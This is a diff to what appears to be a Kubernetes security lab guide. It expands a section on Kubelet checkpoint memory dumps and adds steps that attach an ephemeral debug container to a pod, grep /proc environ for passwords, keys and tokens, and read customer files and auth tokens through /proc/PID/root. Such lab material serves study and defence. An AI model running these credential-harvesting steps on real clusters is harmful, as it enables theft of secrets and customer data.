@@ -170,7 +170,7 @@ customer_id,email,credit_card
 1002,bob@example.com,5500005555555559
 ```
 
-### Step 6 — Use the Kubelet Checkpoint API (memory dump)
+### Step 6 — Use the Kubelet Checkpoint API (memory dump) — Advanced (requires CRIU — not available on Kind)
 
 The Kubelet Checkpoint API creates an OCI-compliant checkpoint archive of a running container. It captures all memory pages, including secrets that exist only in memory (decryption keys, session tokens, plaintext passwords).
 
@@ -204,6 +204,61 @@ Expected output (when CRIU is enabled on the node):
 ```
 
 > **Note:** The Kubelet Checkpoint API requires CRIU (Checkpoint/Restore In Userspace) to be installed on the node. Standard Kind clusters do not include CRIU, so this step returns `method CheckpointContainer not implemented`. In a production cluster with CRIU enabled, the resulting `.tar` file contains a full memory snapshot of the container. This archive can be exfiltrated and analyzed with tools like `crit` (CRIU restore) or `strings` to extract plaintext secrets from memory.
+
+## Using Ephemeral Debug Containers
+
+Ephemeral containers provide a practical alternative to the Checkpoint API for inspecting running pods. They work on any cluster (including Kind) and do not require CRIU. The debug container shares the target container's process namespace and volumes, giving full visibility into its runtime state.
+
+### Step 1 — Attach a debug container to the running pod
+
+```bash
+POD=$(kubectl get pod -n prod-app -l app=sensitive-app -o jsonpath='{.items[0].metadata.name}')
+
+kubectl debug -it -n prod-app "$POD" \
+  --image=busybox:1.36 \
+  --target=app \
+  -- sh
+```
+
+The `--target=app` flag shares the process namespace with the `app` container, making its processes and filesystem visible.
+
+### Step 2 — List the target container's process tree
+
+Inside the debug container:
+
+```sh
+# The target container's processes are visible via the shared pid namespace
+ps aux
+```
+
+You will see the `sleep 3600` loop from the sensitive-app container alongside any processes in the debug container.
+
+### Step 3 — Read the target container's environment variables
+
+Each process's environment is exposed via `/proc/<PID>/environ`:
+
+```sh
+# Find the target process PID (the sleep command from sensitive-app)
+TARGET_PID=$(pgrep -f "sleep 3600" | head -1)
+
+# Dump its environment variables — secrets included
+cat /proc/$TARGET_PID/environ | tr '\0' '\n' | grep -iE "(PASSWORD|SECRET|KEY|TOKEN)"
+```
+
+Expected output includes `DB_PASSWORD`, `AWS_ACCESS_KEY_ID`, and `AWS_SECRET_ACCESS_KEY` from the target container.
+
+### Step 4 — Access shared volumes
+
+The target container's filesystem is accessible at `/proc/<PID>/root`:
+
+```sh
+# Read files from the target container's data volume
+ls /proc/$TARGET_PID/root/data/
+cat /proc/$TARGET_PID/root/data/customers.csv
+cat /proc/$TARGET_PID/root/data/auth_token.txt
+```
+
+Type `exit` to leave the debug container. Ephemeral containers cannot be removed — they remain in `Completed` state until the pod is deleted.
 
 ## Cleanup
 
